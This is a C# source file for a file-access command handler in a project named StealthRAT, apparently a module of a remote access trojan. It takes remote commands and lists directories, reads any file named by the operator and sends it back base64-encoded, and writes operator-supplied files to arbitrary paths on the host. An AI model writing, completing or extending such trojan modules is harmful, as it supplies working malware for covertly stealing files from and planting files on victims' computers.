using System;
using System.IO;
using System.Collections.Generic;
using System.Text.Json;
using System.Threading.Tasks;
using StealthRAT.Interfaces;
using StealthRAT.Services;

namespace StealthRAT.Handlers
{
    /// <summary>
    /// Handles the "fileaccess" action command to navigate, download, and upload files.
    /// </summary>
    public sealed class FileAccessHandler : ICommandHandler
    {
        public string CommandName => "fileaccess";

        public async Task ExecuteAsync(JsonElement payload, CommandContext context)
        {
            if (!payload.TryGetProperty("sub", out var subProp) || !payload.TryGetProperty("path", out var pathProp))
            {
                await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                {
                    type = "cmd_response",
                    success = false,
                    output = "ERR: Missing 'sub' or 'path' in fileaccess payload."
                }));
                return;
            }

            string sub = subProp.GetString() ?? "";
            string path = pathProp.GetString() ?? "";
            string fileData = payload.TryGetProperty("data", out var dataProp) ? dataProp.GetString() ?? "" : "";

            AuditLoggerService.LogAction("fileaccess", $"Sub: {sub} | Path: {path}");

            try
            {
                switch (sub.ToLowerInvariant())
                {
                    case "list":
                        var dir = new DirectoryInfo(path);
                        if (!dir.Exists)
                        {
                            await context.SendTextResponseAsync(JsonSerializer.Serialize(new 
                            { 
                                type = "file_list", 
                                path = path, 
                                files = new List<object>() 
                            }));
                            return;
                        }

                        var items = new List<object>();
                        foreach (var d in dir.GetDirectories())
                        {
                            items.Add(new { name = d.Name, isDir = true, size = 0L });
                        }
                        foreach (var f in dir.GetFiles())
                        {
                            items.Add(new { name = f.Name, isDir = false, size = f.Length });
                        }

                        await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                        {
                            type = "file_list",
                            path = dir.FullName,
                            files = items
                        }));
                        break;

                    case "download":
                        if (File.Exists(path))
                        {
                            byte[] data = await File.ReadAllBytesAsync(path, context.CancellationToken);
                            string b64 = Convert.ToBase64String(data);
                            var downloadPayload = new 
                            { 
                                type = "file_download", 
                                name = Path.GetFileName(path), 
                                data = b64 
                            };
                            await context.SendTextResponseAsync(JsonSerializer.Serialize(downloadPayload));
                        }
                        else
                        {
                            await context.SendTextResponseAsync(JsonSerializer.Serialize(new 
                            { 
                                type = "cmd_response", 
                                success = false, 
                                output = $"ERR: File {path} not found." 
                            }));
                        }
                        break;

                    case "upload":
                        byte[] fileBytes = Convert.FromBase64String(fileData);
                        string? dirPath = Path.GetDirectoryName(path);
                        if (!string.IsNullOrEmpty(dirPath))
                        {
                            Directory.CreateDirectory(dirPath);
                        }

                        await File.WriteAllBytesAsync(path, fileBytes, context.CancellationToken);
                        await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                        {
                            type = "file_upload_status",
                            success = true,
                            message = $"Saved {Path.GetFileName(path)} successfully."
                        }));
                        break;

                    default:
                        await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                        {
                            type = "cmd_response",
                            success = false,
                            output = $"ERR: Unknown fileaccess sub-action '{sub}'."
                        }));
                        break;
                }
            }
            catch (Exception ex)
            {
                await context.SendTextResponseAsync(JsonSerializer.Serialize(new
                {
                    type = "cmd_response",
                    success = false,
                    output = $"ERR: {ex.Message}"
                }));
            }
        }
    }
}
